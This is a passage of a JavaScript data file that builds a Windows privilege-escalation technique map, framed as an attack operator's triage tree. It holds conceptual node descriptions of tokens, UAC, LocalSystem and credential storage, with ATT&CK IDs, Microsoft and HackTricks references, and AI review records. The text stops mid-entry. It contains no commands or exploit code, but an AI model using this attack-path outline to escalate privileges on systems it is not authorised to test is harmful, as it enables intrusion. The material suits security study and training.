import { mitre, r } from '../lib.js';
import { range } from '../windows-versions.js';

/**
 * Windows local privilege-escalation topics. See individual review records for source-comparison scope.
 *
 * Shaped as the operator's triage tree (see windows-pe.ts). The single foothold/triage
 * node forks by CONTEXT into three lanes:
 *
 * - PRIVILEGED USERS (`hold`): a token privilege (`pe-cat-tokens`) or group membership
 *   (`pe-cat-groups`) you already hold: abuse it directly.
 * - ADMIN USERS (`admin`): already an administrator, so bypass UAC (`pe-cat-uac`) to a
 *   high-integrity token, then any Admin -> SYSTEM technique (`pe-cat-admin2sys`).
 * - UNPRIVILEGED USERS (`finding`): no inherent privilege; enumerate for a weakness in
 *   stored creds, service misconfigs, DLL/PATH, tasks/autoruns, app/service abuse,
 *   or a known-CVE exploit.
 *
 * A few shared MECHANISMS (`pe-prim-*`) are where multiple findings converge on SYSTEM.
 * SYSTEM is the goal and the map ends there; post-exploitation (credential dumping,
 * lateral movement) lives in the Active Directory map, not here.
 */
/** @type {import('../schema.js').TechniqueNodeDef[]} */
export const peTechniqueNodes = [
  // ── Lane folders ────────────────────────────────────────────────────────────
  {
    "id": "pe-cat-priv",
    "label": "Privileged Users",
    "phase": "hold",
    "summary": "Understand the privileges and group information in a Windows access token.",
    "description": "A Windows access token records account identity, group information, and privileges. Privileges authorize system operations; object access rights concern permissions on individual resources. A privilege can be present in a token without being enabled. These distinctions matter when describing an account: a group name and a privilege name represent different parts of the security context.",
    "references": [
      {
        "label": "Microsoft, Access tokens",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
        "section": "Access token contents",
        "kind": "primary"
      },
      {
        "label": "Microsoft, Privileges",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges",
        "section": "Privilege/access-right distinction; access-token checks",
        "kind": "primary"
      },
      {
        "label": "HackTricks, Windows Local Privilege Escalation",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
      },
      {
        "label": "HackTricks, Abusing Tokens",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in the identity, permissions, and audit-policy explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "description": "A Windows access token records account identity, group information, and privileges. Privileges authorize system operations; object access rights concern permissions on individual resources. A privilege can be present in a token without being enabled. These distinctions matter when describing an account: a group name and a privilege name represent different parts of the security context.",
        "id": "pe-cat-priv",
        "label": "Privileged Users",
        "phase": "hold",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Access tokens",
            "section": "Access token contents",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          },
          {
            "kind": "primary",
            "label": "Microsoft, Privileges",
            "section": "Privilege/access-right distinction; access-token checks",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
          },
          {
            "label": "HackTricks, Windows Local Privilege Escalation",
            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
          },
          {
            "label": "HackTricks, Abusing Tokens",
            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
          }
        ],
        "summary": "Understand the privileges and group information in a Windows access token."
      },
      "claims": [
        {
          "text": "An access token records account identity, group information, and privileges.",
          "section": "Microsoft, Access tokens — Access token contents",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          ]
        },
        {
          "text": "Windows distinguishes privileges for system operations from access rights on securable objects.",
          "section": "Microsoft, Privileges — Privilege/access-right distinction; access-token checks",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
          ]
        },
        {
          "text": "Privilege checks consider whether a required privilege is held and enabled.",
          "section": "Microsoft, Privileges — Privilege/access-right distinction; access-token checks",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-cat-admin",
    "label": "Admin Users",
    "phase": "admin",
    "summary": "Distinguish administrator membership from the token used by an application.",
    "description": "An Administrators-group member can run ordinary applications with a standard user token. In the UAC Admin Approval Mode model, Windows provides separate standard and administrator tokens. Elevation uses an administrator token, and the consent or credential prompt is governed by policy. Group membership therefore does not describe the access token used by every application.",
    "references": [
      {
        "label": "Microsoft, How User Account Control works",
        "url": "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works",
        "section": "Sign in process; The UAC user experience",
        "kind": "primary"
      },
      {
        "label": "HackTricks, Windows Local Privilege Escalation",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in the identity, permissions, and audit-policy explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "description": "An Administrators-group member can run ordinary applications with a standard user token. In the UAC Admin Approval Mode model, Windows provides separate standard and administrator tokens. Elevation uses an administrator token, and the consent or credential prompt is governed by policy. Group membership therefore does not describe the access token used by every application.",
        "id": "pe-cat-admin",
        "label": "Admin Users",
        "phase": "admin",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, How User Account Control works",
            "section": "Sign in process; The UAC user experience",
            "url": "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
          },
          {
            "label": "HackTricks, Windows Local Privilege Escalation",
            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
          }
        ],
        "summary": "Distinguish administrator membership from the token used by an application."
      },
      "claims": [
        {
          "text": "Under the UAC Admin Approval Mode model, an administrator can run applications with a standard user token; Windows provides separate standard and administrator tokens.",
          "section": "Microsoft, How User Account Control works — Sign in process; The UAC user experience",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
          ]
        },
        {
          "text": "UAC uses consent or credential prompts for elevation, with prompt behavior controlled by policy.",
          "section": "Microsoft, How User Account Control works — The UAC user experience; The credential prompt",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-cat-enum",
    "label": "Unprivileged Users",
    "phase": "finding",
    "summary": "Understand standard-user access through identity and resource permissions.",
    "description": "Standard-user access still has a security context: the token identifies the account, its groups, and its privileges. Resources can grant permissions to particular users or groups through access-control entries. The label unprivileged should not be read as meaning that an account has no permissions; access is evaluated for the requested resource and operation.",
    "references": [
      {
        "label": "Microsoft, Access tokens",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
        "section": "Access token contents",
        "kind": "primary"
      },
      {
        "label": "Microsoft, DACLs and ACEs",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces",
        "section": "Opening explanation and group-access example",
        "kind": "primary"
      },
      {
        "label": "HackTricks, Windows Local Privilege Escalation",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
      },
      {
        "label": "carlospolop, winPEAS",
        "url": "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in the identity, permissions, and audit-policy explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "description": "Standard-user access still has a security context: the token identifies the account, its groups, and its privileges. Resources can grant permissions to particular users or groups through access-control entries. The label unprivileged should not be read as meaning that an account has no permissions; access is evaluated for the requested resource and operation.",
        "id": "pe-cat-enum",
        "label": "Unprivileged Users",
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Access tokens",
            "section": "Access token contents",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          },
          {
            "kind": "primary",
            "label": "Microsoft, DACLs and ACEs",
            "section": "Opening explanation and group-access example",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces"
          },
          {
            "label": "HackTricks, Windows Local Privilege Escalation",
            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
          },
          {
            "label": "carlospolop, winPEAS",
            "url": "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS"
          }
        ],
        "summary": "Understand standard-user access through identity and resource permissions."
      },
      "claims": [
        {
          "text": "An access token carries the account identity, group information, and privileges used in security checks.",
          "section": "Microsoft, Access tokens — Access token contents",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          ]
        },
        {
          "text": "Discretionary access-control entries can grant resource permissions to particular users or groups.",
          "section": "Microsoft, DACLs and ACEs — Opening explanation and group-access example",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-svc-account",
    "label": "Service Account",
    "phase": "svcacct",
    "summary": "Distinguish built-in service accounts and IIS application-pool identities.",
    "description": "Windows services and application pools can use different account identities. LocalService has limited local privileges and presents anonymous network credentials. NetworkService also has limited local privileges, but presents the computer's credentials to remote servers. IIS application-pool identities use virtual accounts that distinguish individual pools and can be assigned resource permissions. These identities should not be treated as one uniform account.",
    "references": [
      {
        "label": "Microsoft, LocalService Account",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/localservice-account",
        "section": "Opening account definition",
        "kind": "primary"
      },
      {
        "label": "Microsoft, NetworkService Account",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/networkservice-account",
        "section": "Opening account definition and network credentials",
        "kind": "primary"
      },
      {
        "label": "Microsoft, Application Pool Identities",
        "url": "https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities",
        "section": "Application Pool Identity Accounts; Securing Resources",
        "kind": "primary"
      },
      {
        "label": "HackTricks, Abusing Tokens",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in the identity, permissions, and audit-policy explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "description": "Windows services and application pools can use different account identities. LocalService has limited local privileges and presents anonymous network credentials. NetworkService also has limited local privileges, but presents the computer's credentials to remote servers. IIS application-pool identities use virtual accounts that distinguish individual pools and can be assigned resource permissions. These identities should not be treated as one uniform account.",
        "id": "pe-svc-account",
        "label": "Service Account",
        "phase": "svcacct",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, LocalService Account",
            "section": "Opening account definition",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/localservice-account"
          },
          {
            "kind": "primary",
            "label": "Microsoft, NetworkService Account",
            "section": "Opening account definition and network credentials",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/networkservice-account"
          },
          {
            "kind": "primary",
            "label": "Microsoft, Application Pool Identities",
            "section": "Application Pool Identity Accounts; Securing Resources",
            "url": "https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities"
          },
          {
            "label": "HackTricks, Abusing Tokens",
            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
          }
        ],
        "summary": "Distinguish built-in service accounts and IIS application-pool identities."
      },
      "claims": [
        {
          "text": "LocalService has limited local privileges and presents anonymous credentials on the network.",
          "section": "Microsoft, LocalService Account — Opening account definition",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/localservice-account"
          ]
        },
        {
          "text": "NetworkService has limited local privileges and presents the computer's credentials to remote servers.",
          "section": "Microsoft, NetworkService Account — Opening account definition and network credentials",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/networkservice-account"
          ]
        },
        {
          "text": "IIS can use a unique virtual account for an application pool and secure resources using the pool identity.",
          "section": "Microsoft, Application Pool Identities — Application Pool Identity Accounts; Securing Resources",
          "sources": [
            "https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities"
          ]
        }
      ]
    }
  },

  // ── Sub-folders: Privileged Users ───────────────────────────────────────────
  {
    "id": "pe-cat-tokens",
    "label": "Token Privileges",
    "phase": "hold",
    "kind": "category",
    "summary": "System privileges carried by a Windows access token.",
    "description": "An access token describes a process or thread's security context. It includes account and group identifiers and assigned privileges. Privileges authorize system operations and differ from object access rights. Windows checks both possession and enabled state when an operation requires a privilege; assignments can differ between computers.",
    "mitre": {
      "id": "T1134",
      "url": "https://attack.mitre.org/techniques/T1134/"
    },
    "references": [
      {
        "label": "Microsoft, Access tokens",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
        "kind": "primary",
        "section": "Introduction; Access token contents"
      },
      {
        "label": "Microsoft, Privileges",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges",
        "kind": "primary",
        "section": "Introduction: privileges versus access rights; privilege assignment and checks"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "id": "pe-cat-tokens",
        "label": "Token Privileges",
        "phase": "hold",
        "kind": "category",
        "summary": "System privileges carried by a Windows access token.",
        "description": "An access token describes a process or thread's security context. It includes account and group identifiers and assigned privileges. Privileges authorize system operations and differ from object access rights. Windows checks both possession and enabled state when an operation requires a privilege; assignments can differ between computers.",
        "mitre": {
          "id": "T1134",
          "url": "https://attack.mitre.org/techniques/T1134/"
        },
        "references": [
          {
            "label": "Microsoft, Access tokens",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
            "kind": "primary",
            "section": "Introduction; Access token contents"
          },
          {
            "label": "Microsoft, Privileges",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges",
            "kind": "primary",
            "section": "Introduction: privileges versus access rights; privilege assignment and checks"
          }
        ]
      },
      "claims": [
        {
          "text": "Access tokens carry identity, group membership, and privilege information for a process or thread.",
          "section": "Microsoft, Access tokens — Introduction; Access token contents",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          ]
        },
        {
          "text": "System privileges and object access rights are distinct authorization concepts.",
          "section": "Microsoft, Privileges — Introduction: privileges versus access rights; privilege assignment and checks",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
          ]
        },
        {
          "text": "Privilege checks consider whether a privilege is held and enabled; assignments are local to each computer.",
          "section": "Microsoft, Privileges — Introduction: privileges versus access rights; privilege assignment and checks",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-cat-groups",
    "label": "Local Group Membership",
    "phase": "hold",
    "kind": "category",
    "summary": "How group identities participate in Windows access checks.",
    "description": "Windows uses group security identifiers in an access token when evaluating an object's discretionary access control list (DACL). Group identifiers can be enabled, disabled, or deny-only. A group name alone does not describe the access a process receives: the token attributes, requested rights, and object permissions matter.",
    "references": [
      {
        "label": "Microsoft, How AccessCheck Works",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/how-dacls-control-access-to-an-object",
        "kind": "primary",
        "section": "DACLs"
      },
      {
        "label": "Microsoft, SID Attributes in an Access Token",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-attributes-in-an-access-token",
        "kind": "primary",
        "section": "Attribute table: SE_GROUP_ENABLED and SE_GROUP_USE_FOR_DENY_ONLY"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "id": "pe-cat-groups",
        "label": "Local Group Membership",
        "phase": "hold",
        "kind": "category",
        "summary": "How group identities participate in Windows access checks.",
        "description": "Windows uses group security identifiers in an access token when evaluating an object's discretionary access control list (DACL). Group identifiers can be enabled, disabled, or deny-only. A group name alone does not describe the access a process receives: the token attributes, requested rights, and object permissions matter.",
        "references": [
          {
            "label": "Microsoft, How AccessCheck Works",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/how-dacls-control-access-to-an-object",
            "kind": "primary",
            "section": "DACLs"
          },
          {
            "label": "Microsoft, SID Attributes in an Access Token",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-attributes-in-an-access-token",
            "kind": "primary",
            "section": "Attribute table: SE_GROUP_ENABLED and SE_GROUP_USE_FOR_DENY_ONLY"
          }
        ]
      },
      "claims": [
        {
          "text": "DACL evaluation compares access-control entries with identities in the requesting security context.",
          "section": "Microsoft, How AccessCheck Works — DACLs",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/how-dacls-control-access-to-an-object"
          ]
        },
        {
          "text": "Enabled, disabled, and deny-only group identifiers have different roles in access checks.",
          "section": "Microsoft, SID Attributes in an Access Token — Attribute table: SE_GROUP_ENABLED and SE_GROUP_USE_FOR_DENY_ONLY",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-attributes-in-an-access-token"
          ]
        }
      ]
    }
  },

  // ── Sub-folders: Admin Users ────────────────────────────────────────────────
  {
    "id": "pe-cat-uac",
    "label": "UAC Bypass",
    "phase": "admin",
    "kind": "category",
    "summary": "Understand filtered administrator tokens and UAC elevation.",
    "description": "Under UAC Admin Approval Mode, an administrator has a standard user token and an administrator token. The standard token filters administrative privileges and security identifiers for everyday applications. Using the full administrator token follows the configured elevation policy. Standard users can perform an administrative task by supplying valid administrator credentials when the policy permits it.",
    "mitre": {
      "id": "T1548.002",
      "url": "https://attack.mitre.org/techniques/T1548/002/"
    },
    "references": [
      {
        "label": "Microsoft, How User Account Control works",
        "url": "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works",
        "section": "Sign in process; The UAC user experience",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "description": "Under UAC Admin Approval Mode, an administrator has a standard user token and an administrator token. The standard token filters administrative privileges and security identifiers for everyday applications. Using the full administrator token follows the configured elevation policy. Standard users can perform an administrative task by supplying valid administrator credentials when the policy permits it.",
        "id": "pe-cat-uac",
        "kind": "category",
        "label": "UAC Bypass",
        "mitre": {
          "id": "T1548.002",
          "url": "https://attack.mitre.org/techniques/T1548/002/"
        },
        "phase": "admin",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, How User Account Control works",
            "section": "Sign in process; The UAC user experience",
            "url": "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
          }
        ],
        "summary": "Understand filtered administrator tokens and UAC elevation."
      },
      "claims": [
        {
          "text": "The administrator sign-in model uses separate standard and administrator tokens; the standard token filters administrative privileges and security identifiers.",
          "section": "Microsoft, How User Account Control works — Sign in process",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
          ]
        },
        {
          "text": "UAC distinguishes administrator consent from a standard user supplying administrator credentials, with prompt behavior controlled by policy.",
          "section": "Microsoft, How User Account Control works — The UAC user experience; The credential prompt; The consent prompt",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-cat-admin2sys",
    "label": "Elevate to SYSTEM",
    "phase": "admin",
    "kind": "category",
    "summary": "Distinguish LocalSystem from an interactive administrator account.",
    "description": "LocalSystem is a predefined account used by the service control manager and has extensive privileges on the local computer. It is not associated with a logged-on user account. Windows access tokens identify the account, groups, and privileges associated with a process or thread; LocalSystem describes an account identity, rather than a new name for an interactive administrator.",
    "mitre": {
      "id": "T1134.001",
      "url": "https://attack.mitre.org/techniques/T1134/001/"
    },
    "references": [
      {
        "label": "Microsoft, LocalSystem Account",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account",
        "section": "Introduction",
        "kind": "primary"
      },
      {
        "label": "Microsoft, Access Tokens",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
        "section": "Introduction",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "description": "LocalSystem is a predefined account used by the service control manager and has extensive privileges on the local computer. It is not associated with a logged-on user account. Windows access tokens identify the account, groups, and privileges associated with a process or thread; LocalSystem describes an account identity, rather than a new name for an interactive administrator.",
        "id": "pe-cat-admin2sys",
        "kind": "category",
        "label": "Elevate to SYSTEM",
        "mitre": {
          "id": "T1134.001",
          "url": "https://attack.mitre.org/techniques/T1134/001/"
        },
        "phase": "admin",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, LocalSystem Account",
            "section": "Introduction",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account"
          },
          {
            "kind": "primary",
            "label": "Microsoft, Access Tokens",
            "section": "Introduction",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          }
        ],
        "summary": "Distinguish LocalSystem from an interactive administrator account."
      },
      "claims": [
        {
          "text": "LocalSystem is a predefined service-control-manager account with extensive local privileges and is not associated with a logged-on user account.",
          "section": "Microsoft, LocalSystem Account — Introduction",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account"
          ]
        },
        {
          "text": "Access tokens contain account and group security identifiers and the account's privileges.",
          "section": "Microsoft, Access Tokens — Access token contents",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          ]
        }
      ]
    }
  },

  // ── Sub-folders: Unprivileged Users ─────────────────────────────────────────
  {
    "id": "pe-cat-creds",
    "label": "Stored Credentials",
    "phase": "finding",
    "kind": "category",
    "summary": "Distinguish credential storage from data-protection mechanisms.",
    "description": "Windows provides Credentials Management APIs for applications to obtain and manage information such as user names and passwords, including a user credentials store. DPAPI provides encryption and integrity protection for application data. These are different mechanisms: a storage location alone does not describe the protection applied to its contents.",
    "mitre": {
      "id": "T1552",
      "url": "https://attack.mitre.org/techniques/T1552/"
    },
    "references": [
      {
        "label": "Microsoft, Credentials Management",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthn/credentials-management",
        "section": "Introduction",
        "kind": "primary"
      },
      {
        "label": "Microsoft, CryptProtectData function",
        "url": "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata",
        "section": "Introduction; Remarks",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "description": "Windows provides Credentials Management APIs for applications to obtain and manage information such as user names and passwords, including a user credentials store. DPAPI provides encryption and integrity protection for application data. These are different mechanisms: a storage location alone does not describe the protection applied to its contents.",
        "id": "pe-cat-creds",
        "kind": "category",
        "label": "Stored Credentials",
        "mitre": {
          "id": "T1552",
          "url": "https://attack.mitre.org/techniques/T1552/"
        },
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Credentials Management",
            "section": "Introduction",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthn/credentials-management"
          },
          {
            "kind": "primary",
            "label": "Microsoft, CryptProtectData function",
            "section": "Introduction; Remarks",
            "url": "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata"
          }
        ],
        "summary": "Distinguish credential storage from data-protection mechanisms."
      },
      "claims": [
        {
          "text": "Windows Credentials Management APIs obtain and manage credential information and provide options to add information to the user's credentials store.",
          "section": "Microsoft, Credentials Management — Introduction",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthn/credentials-management"
          ]
        },
        {
          "text": "CryptProtectData encrypts application data and adds a keyed integrity check against tampering.",
          "section": "Microsoft, CryptProtectData function — Introduction; Remarks",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata"
          ]
        }
      ]
    }
  },
  // Stored Credentials grouped by where the secret lives.
  {
    "id": "creds-registry",
    "label": "Registry & Hives",
    "phase": "finding",
    "kind": "category",
    "summary": "Understand registry hives and access control on keys.",
    "description": "A registry hive groups keys, subkeys, and values with supporting files that Windows loads into memory. Registry keys are securable objects with security descriptors. Windows checks requested key access against that descriptor, so the registry's organization and a caller's permission to read or change a key are separate concepts.",
    "mitre": {
      "id": "T1552.002",
      "url": "https://attack.mitre.org/techniques/T1552/002/"
    },
    "references": [
      {
        "label": "Microsoft, Registry Hives",
        "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives",
        "section": "Introduction",
        "kind": "primary"
      },
      {
        "label": "Microsoft, Registry Key Security and Access Rights",
        "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights",
        "section": "Introduction",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "description": "A registry hive groups keys, subkeys, and values with supporting files that Windows loads into memory. Registry keys are securable objects with security descriptors. Windows checks requested key access against that descriptor, so the registry's organization and a caller's permission to read or change a key are separate concepts.",
        "id": "creds-registry",
        "kind": "category",
        "label": "Registry & Hives",
        "mitre": {
          "id": "T1552.002",
          "url": "https://attack.mitre.org/techniques/T1552/002/"
        },
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Registry Hives",
            "section": "Introduction",
            "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives"
          },
          {
            "kind": "primary",
            "label": "Microsoft, Registry Key Security and Access Rights",
            "section": "Introduction",
            "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights"
          }
        ],
        "summary": "Understand registry hives and access control on keys."
      },
      "claims": [
        {
          "text": "A hive is a logical grouping of registry keys, subkeys, and values with supporting files loaded into memory.",
          "section": "Microsoft, Registry Hives — Introduction",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives"
          ]
        },
        {
          "text": "Registry keys have security descriptors, and opening a key checks the requested access rights against its descriptor.",
          "section": "Microsoft, Registry Key Security and Access Rights — Introduction; RegOpenKeyEx access check",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights"
          ]
        }
      ]
    }
  },
  {
    "id": "creds-files",
    "label": "Files & History",
    "phase": "finding",
    "kind": "category",
    "summary": "Recognize the confidentiality risk of secrets in files and history.",
    "description": "Files and command history can retain sensitive information. Microsoft documents that PSReadLine persists command history, which can contain passwords, and attempts to filter sensitive entries. That filtering should not be treated as a guarantee that history is free of secrets. CWE-312 describes the separate storage weakness of keeping sensitive information in cleartext where it may be accessible outside the intended control boundary.",
    "mitre": {
      "id": "T1552.001",
      "url": "https://attack.mitre.org/techniques/T1552/001/"
    },
    "references": [
      {
        "label": "Microsoft, about_PSReadLine",
        "url": "https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline?view=powershell-7.6",
        "section": "Command History",
        "kind": "primary"
      },
      {
        "label": "MITRE, CWE-312: Cleartext Storage of Sensitive Information",
        "url": "https://cwe.mitre.org/data/definitions/312.html",
        "section": "Description",
        "kind": "taxonomy"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "description": "Files and command history can retain sensitive information. Microsoft documents that PSReadLine persists command history, which can contain passwords, and attempts to filter sensitive entries. That filtering should not be treated as a guarantee that history is free of secrets. CWE-312 describes the separate storage weakness of keeping sensitive information in cleartext where it may be accessible outside the intended control boundary.",
        "id": "creds-files",
        "kind": "category",
        "label": "Files & History",
        "mitre": {
          "id": "T1552.001",
          "url": "https://attack.mitre.org/techniques/T1552/001/"
        },
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, about_PSReadLine",
            "section": "Command History",
            "url": "https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline?view=powershell-7.6"
          },
          {
            "kind": "taxonomy",
